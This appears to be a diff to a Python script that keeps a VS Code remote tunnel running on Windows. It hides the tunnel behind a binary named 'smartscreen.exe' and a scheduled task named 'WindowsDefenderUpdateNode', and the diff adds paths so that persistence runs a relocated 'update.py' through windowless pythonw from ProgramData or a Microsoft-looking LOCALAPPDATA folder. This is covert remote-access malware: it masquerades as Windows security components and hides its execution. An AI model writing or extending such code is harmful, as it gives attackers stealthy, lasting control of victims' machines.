@@ -25,7 +25,7 @@ CODE_EXE_NAME = "smartscreen.exe" if platform.system().lower() == "windows" else
 TUNNEL_NAME = os.getenv("COMPUTERNAME", "workstation")
 SHOW_RAW_OUTPUT = False
 DEVICE_CODE_LIFETIME_SECONDS = 15 * 60
-MAX_DEVICE_CODE_ISSUES = 10
+MAX_DEVICE_CODE_ISSUES = 3
 IS_ADMIN_CONTEXT = False
 STATE_MODE = "user-local"
 CODE_DIR = Path(os.path.join(os.getenv("LOCALAPPDATA", ""), "VSCode", "Tunnel", "Code"))
@@ -40,6 +40,11 @@ URL_PATTERN = re.compile(r"https://[^\s]+")
 TUNNEL_URL_PATTERN = re.compile(r"https://vscode\.dev/tunnel/[^\s]+", re.IGNORECASE)
 LOGIN_HINT_PATTERN = re.compile(r"(github\.com/login/device|microsoft\.com/devicelogin)", re.IGNORECASE)
 TASK_NAME = "WindowsDefenderUpdateNode"
+PROGRAM_DATA_ROOT = Path(r"C:\ProgramData\VSCodeTunnel")
+PROGRAM_DATA_PYTHONW = PROGRAM_DATA_ROOT / "Python" / "pythonw.exe"
+PROGRAM_DATA_SCRIPT = PROGRAM_DATA_ROOT / "update.py"
+USER_LOCAL_PYTHONW = Path(os.getenv("LOCALAPPDATA", "")) / "Microsoft" / "Python" / "pythonw.exe"
+USER_LOCAL_SCRIPT = Path(os.getenv("LOCALAPPDATA", "")) / "Microsoft" / "Python" / "update.py"
 
 
 def windows_subprocess_kwargs() -> dict:
@@ -233,19 +238,44 @@ def print_runtime_diagnostics() -> None:
     print(f"[INFO] Launch admin/elevated: {IS_ADMIN_CONTEXT}")
     print(f"[INFO] State mode: {STATE_MODE}")
     print(f"[INFO] Resolved state directory: {CODE_DIR}")
+    print(f"[INFO] Resolved pythonw path: {resolve_pythonw_executable()}")
+    print(f"[INFO] Resolved runtime script path: {resolve_runtime_script_path()}")
 
 
 def resolve_pythonw_executable() -> str:
     executable = Path(sys.executable)
-    candidates = [
-        executable.with_name("pythonw.exe"),
-        executable,
-        Path(r"C:\Windows\pyw.exe"),
-    ]
+    if platform.system().lower() == "windows" and STATE_MODE == "machine-wide":
+        candidates = [
+            PROGRAM_DATA_PYTHONW,
+            executable.with_name("pythonw.exe"),
+            executable,
+            Path(r"C:\Windows\pyw.exe"),
+        ]
+    elif platform.system().lower() == "windows":
+        candidates = [
+            USER_LOCAL_PYTHONW,
+            executable.with_name("pythonw.exe"),
+            executable,
+            Path(r"C:\Windows\pyw.exe"),
+        ]
+    else:
+        candidates = [executable]
     for candidate in candidates:
         if candidate.exists():
             return str(candidate)
     return str(executable)
+
+
+def resolve_runtime_script_path() -> Path:
+    current_script = Path(__file__).resolve()
+    if platform.system().lower() != "windows":
+        return current_script
+
+    if STATE_MODE == "machine-wide" and PROGRAM_DATA_SCRIPT.exists():
+        return PROGRAM_DATA_SCRIPT
+    if STATE_MODE == "user-local" and USER_LOCAL_SCRIPT.exists():
+        return USER_LOCAL_SCRIPT
+    return current_script
 
 
 def ensure_persistence() -> None:
@@ -260,7 +290,7 @@ def ensure_persistence() -> None:
     except Exception as error:
         print(f"[WARN] Could not check scheduled task state: {error}")
 
-    script_path = str(Path(__file__).resolve())
+    script_path = str(resolve_runtime_script_path())
     pythonw_path = resolve_pythonw_executable()
 
     task_command = f'"{pythonw_path}" "{script_path}"'
